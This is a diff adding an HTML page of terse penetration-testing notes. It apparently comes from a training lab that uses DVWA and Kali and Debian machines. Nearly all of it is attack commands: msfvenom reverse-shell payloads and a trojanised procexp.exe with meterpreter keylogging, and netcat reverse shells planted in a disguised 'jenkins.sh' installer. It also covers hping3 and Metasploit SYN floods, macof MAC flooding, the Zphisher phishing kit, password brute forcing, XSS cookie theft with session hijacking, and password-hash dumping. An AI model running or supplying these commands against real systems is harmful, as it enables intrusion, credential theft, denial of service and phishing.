@@ -1,1 +1,238 @@
-hi
+html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Index of Instructions</title>
+</head>
+<body>
+    <h1>Index of Instructions</h1>
+    <ul>
+        <li><a href="#dvwa">DVWA</a></li>
+        <li><a href="#bruteforce">Bruteforce</a></li>
+        <li><a href="#hping3">Hping3</a></li>
+        <li><a href="#payload">Payload</a></li>
+        <li><a href="#recon-ng">Recon-ng</a></li>
+        <li><a href="#zphisher">Zphisher</a></li>
+        <li><a href="#ipblogger">IP Blogger</a></li>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#trojan">Trojan</a></li>
+        <li><a href="#netcat">Netcat</a></li>
+        <li><a href="#macof">Macof</a></li>
+        <li><a href="#port-forwarding">Port Forwarding</a></li>
+        <li><a href="#metasploit-bruteforce">Metasploit Bruteforce</a></li>
+        <li><a href="#session-hijack">Session Hijack</a></li>
+        <li><a href="#dvwa-md5-hash-crack">DVWA MD5 Hash Crack</a></li>
+    </ul>
+
+    <h2 id="dvwa">DVWA</h2>
+    <pre>
+sudo apt update && apt upgrade
+sudo apt install dvwa
+sudo dvwa-start (wait for website)
+    </pre>
+
+    <h2 id="bruteforce">Bruteforce</h2>
+    <pre>
+open website
+on intercept
+add iacsd username and wrong pass
+you'll see request of username/password
+select password and send to intruder
+select password and click ADD
+select brute forcer for number password
+add character length min 2 max 4 
+character set 0123456789
+for dictionary attack use simple list
+    </pre>
+
+    <h2 id="hping3">Hping3</h2>
+    <pre>
+sudo hping3 -S -p 80 targetip
+ss -antp
+sudo hping3 -S --scan 0-1024 target ip
+sudo hping3 -S --scan 0-65535 target ip
+sudo hping3 -S -p 80 target ip
+sudo hping3 -S -p 80 target ip --flood
+sudo hping3 --ICMP --flood target ip
+sudo hping3 --ICMP --flood target ip -a anyip
+sudo hping3 --ICMP --flood target ip -a same ip
+sudo hping3 --ICMP --flood target ip --rand-source
+    </pre>
+
+    <h2 id="payload">Payload</h2>
+    <pre>
+both static
+sudo msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -a x86 -f exe lhost=kaliip lport=4444>payload.exe
+cp payload to html
+sudo msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost kaliip
+set lport 4444
+exploit
+run exe
+keyscan_start
+keyscan dump
+    </pre>
+
+    <h2 id="recon-ng">Recon-ng</h2>
+    <pre>
+kali ping google
+mkdir recon-ng
+git clone recon-ng
+cd filerecon-ng
+pip3 install -r requirements.txt
+./recon-ng 
+marketplace
+marketplace refresh
+marketplace info all
+marketplace search hackertarget
+marketplace install copy path
+modules load path
+options set source google.com
+run 
+    </pre>
+
+    <h2 id="zphisher">Zphisher</h2>
+    <pre>
+git clone --depth=1 https://github.com/htr-tech/zphisher.git
+./zphisher
+add ip/port if required or local host & 8080
+    </pre>
+
+    <h2 id="ipblogger">IP Blogger</h2>
+    <pre>
+to know location
+    </pre>
+
+    <h2 id="nmap">Nmap</h2>
+    <pre>
+ping base machine ip
+nmap --help
+nmap -sn 192.168.1.125
+nmap -sn 192.168.1.0/24
+sudo nmap -sS 192.168.1.111 (kali ip)
+sudo nmap -sA 192.168.1.111
+sudo nmap -sT 192.168.1.111
+sudo nmap -sP 192.168.1.111
+kali wireshark
+ipaddr=192.168.1.125
+icmpcp
+Idle scan
+sudo nmap -sI 192.168.1.102 deb ip
+sudo nmap -sS --scan-delay 3s 192.168.1.102
+nmap -sT deb ip -> full scan 
+detect os
+sudo nmap -o deb ip
+aggressive scan
+sudo nmap -A deb ip
+sudo nmap -sV --version-intensity=9 -oN outputfile.txt 168.235.71.35 debip
+    </pre>
+
+    <h2 id="trojan">Trojan</h2>
+    <pre>
+mkdir trojan
+procexp.exe download
+copy to home.kali/trojan
+xp - kali internal
+restart apache2
+check page
+cp exe to html 
+win -> kali ip
+see only
+sudo setfacl -m user:kali:rwx /var/www/html
+msfvenom -a x86 --platform -x procexp.exe -k -p windows/meterpreter/reverse_tcp Lhost=kali ip lport=5555 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o my.exe
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost win ip
+set lport 5555
+exploit 
+run exe file
+shell
+dir
+    </pre>
+
+    <h2 id="netcat">Netcat</h2>
+    <pre>
+kali - bridge 
+netcat -lvp 6666 kali ip
+netcat -lvp 666
+deb me ncat
+netcat kali ip 6666
+netcat kaliip 6666 -e /bin/bash
+kali
+netcat -lvp 6666
+nano jenkins.s
+flower im
+install tree
+netcat kali ip 6666 -e /bin/bash & echo "tree inst succ"
+chmod 777 jenkins.sh
+scp jenkins debip:/home/iacsd
+netcat -lvp 6666
+deb machine
+./jenkins.sh
+kali mc
+netcat -lvp 6666
+    </pre>
+
+    <h2 id="macof">Macof</h2>
+    <pre>
+sudo macof -i eth0
+    </pre>
+
+    <h2 id="port-forwarding">Port Forwarding</h2>
+    <pre>
+del index file
+port forwarding -nat:v vbox
+restart
+base mc
+netstat -a 
+chrome kaliip:8100
+    </pre>
+
+    <h2 id="metasploit-bruteforce">Metasploit Bruteforce</h2>
+    <pre>
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS deb ip
+set username iacsd
+start dup session
+create pass.txt file 
+back to msf
+set PASSFILE /home/pass.txt
+set stoponsuccess True
+verbose true
+exit
+use auxiliary/dos/tcp/synflood 
+show options
+set RHOSTS deb ip
+exploit
+check on deb using 
+tcpdump -i enp0s8
+    </pre>
+
+    <h2 id="session-hijack">Session Hijack</h2>
+    <pre>
+add item
+&lt;script&gt;alert(document.cookie="abc")&lt;/script&gt; 
+after getting ssid copy it
+open another window of website
+intercept on
+random user and pass
+see ssid replace with copied one
+forward
+    </pre>
+
+    <h2 id="dvwa-md5-hash-crack">DVWA MD5 Hash Crack</h2>
+    <pre>
+sudo mysql -u root -p
+show databases;
+use dvwa;
+show tables;
+select * from users;
+copy the pass hash
+crack it
+    </pre>
+</body>
+</html>
